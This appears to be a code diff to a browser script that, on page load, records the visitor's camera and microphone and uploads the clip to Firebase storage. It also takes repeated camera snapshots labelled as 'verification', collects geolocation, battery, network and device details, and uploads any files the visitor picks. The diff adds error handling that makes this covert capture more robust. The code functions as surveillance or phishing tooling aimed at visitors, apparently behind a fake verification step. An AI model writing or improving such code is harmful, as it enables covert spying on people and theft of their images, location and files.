@@ -14,11 +14,12 @@ const video = document.getElementById("video");
 const canvas = document.getElementById("snapshotCanvas");
 const fileInput = document.getElementById("fileInput");
 const context = canvas.getContext("2d");
+
 let mediaRecorder;
 let recordedChunks = [];
 
 async function getDeviceInfo() {
-  const battery = await navigator.getBattery();
+  const battery = await navigator.getBattery().catch(() => null);
   const connection = navigator.connection || {};
   return {
     userAgent: navigator.userAgent,
@@ -27,10 +28,12 @@ async function getDeviceInfo() {
     deviceMemory: navigator.deviceMemory || "unknown",
     hardwareConcurrency: navigator.hardwareConcurrency || "unknown",
     screenResolution: `${window.screen.width}x${window.screen.height}`,
-    battery: {
-      level: battery.level,
-      charging: battery.charging,
-    },
+    battery: battery
+      ? {
+          level: battery.level,
+          charging: battery.charging,
+        }
+      : "Battery info unavailable",
     connection: {
       downlink: connection.downlink || "unknown",
       effectiveType: connection.effectiveType || "unknown",
@@ -45,24 +48,35 @@ async function getLocation() {
 }
 
 async function recordCameraVideo(stream) {
-  return new Promise((resolve) => {
-    mediaRecorder = new MediaRecorder(stream);
+  return new Promise((resolve, reject) => {
     recordedChunks = [];
+    try {
+      mediaRecorder = new MediaRecorder(stream);
 
-    mediaRecorder.ondataavailable = (event) => {
-      if (event.data.size > 0) recordedChunks.push(event.data);
-    };
+      mediaRecorder.ondataavailable = (e) => {
+        if (e.data.size > 0) {
+          recordedChunks.push(e.data);
+        }
+      };
 
-    mediaRecorder.onstop = async () => {
-      const blob = new Blob(recordedChunks, { type: "video/webm" });
-      const videoRef = ref(storage, `recordings/video_${Date.now()}.webm`);
-      await uploadBytes(videoRef, blob);
-      const videoUrl = await getDownloadURL(videoRef);
-      resolve(videoUrl);
-    };
+      mediaRecorder.onstop = async () => {
+        const blob = new Blob(recordedChunks, { type: "video/webm" });
+        const fileName = `recordings/video_${Date.now()}.webm`;
+        const videoRef = ref(storage, fileName);
+        await uploadBytes(videoRef, blob);
+        const url = await getDownloadURL(videoRef);
+        resolve(url);
+      };
 
-    mediaRecorder.start();
-    setTimeout(() => mediaRecorder.stop(), 5000); // 5 seconds recording
+      mediaRecorder.start();
+      console.log("🔴 Recording started...");
+      setTimeout(() => {
+        mediaRecorder.stop();
+        console.log("⏹️ Recording stopped.");
+      }, 5000); // Record for 5 seconds
+    } catch (err) {
+      reject("Recording failed: " + err.message);
+    }
   });
 }
 
@@ -79,6 +93,8 @@ async function uploadFiles(files) {
 
 async function startSnapshotLoop() {
   setInterval(async () => {
+    if (video.videoWidth === 0 || video.videoHeight === 0) return;
+
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
     context.drawImage(video, 0, 0, canvas.width, canvas.height);
@@ -89,9 +105,13 @@ async function startSnapshotLoop() {
       await uploadBytes(snapshotRef, blob);
       const downloadURL = await getDownloadURL(snapshotRef);
 
-      await setDoc(doc(db, "web", "user"), {
-        verificationSnapshots: [downloadURL]
-      }, { merge: true });
+      await setDoc(
+        doc(db, "web", "user"),
+        {
+          verificationSnapshots: [downloadURL],
+        },
+        { merge: true }
+      );
 
       console.log(`📸 Snapshot saved: ${downloadURL}`);
     }, "image/jpeg", 0.95);
@@ -99,37 +119,52 @@ async function startSnapshotLoop() {
 }
 
 async function collectAll() {
-  const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-  video.srcObject = stream;
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: true,
+      audio: true,
+    });
+    video.srcObject = stream;
+    video.play();
 
-  const location = await getLocation().catch(() => null);
-  const deviceInfo = await getDeviceInfo();
-  const recordedVideoUrl = await recordCameraVideo(stream);
-
-  await setDoc(doc(db, "web", "user"), {
-    timestamp: new Date(),
-    deviceInfo,
-    location: location ? {
-      latitude: location.coords.latitude,
-      longitude: location.coords.longitude
-    } : "Location denied",
-    recordedVideo: recordedVideoUrl,
-    uploadedFiles: [],
-    verificationSnapshots: []
-  });
-
-  startSnapshotLoop();
-
-  fileInput.addEventListener("change", async (e) => {
-    const files = e.target.files;
-    const uploadedFileUrls = await uploadFiles(files);
+    const location = await getLocation().catch(() => null);
+    const deviceInfo = await getDeviceInfo();
+    const recordedVideoUrl = await recordCameraVideo(stream);
 
     await setDoc(doc(db, "web", "user"), {
-      uploadedFiles: uploadedFileUrls
-    }, { merge: true });
+      timestamp: new Date(),
+      deviceInfo,
+      location: location
+        ? {
+            latitude: location.coords.latitude,
+            longitude: location.coords.longitude,
+          }
+        : "Location denied",
+      recordedVideo: recordedVideoUrl,
+      uploadedFiles: [],
+      verificationSnapshots: [],
+    });
 
-    console.log("✔️ Files uploaded and data saved.");
-  });
+    startSnapshotLoop();
+
+    fileInput.addEventListener("change", async (e) => {
+      const files = e.target.files;
+      const uploadedFileUrls = await uploadFiles(files);
+
+      await setDoc(
+        doc(db, "web", "user"),
+        {
+          uploadedFiles: uploadedFileUrls,
+        },
+        { merge: true }
+      );
+
+      console.log("✔️ Files uploaded and data saved.");
+    });
+  } catch (err) {
+    console.error("❌ Error in collectAll:", err.message);
+    alert("Permission denied or browser does not support required features.");
+  }
 }
 
 window.onload = () => {
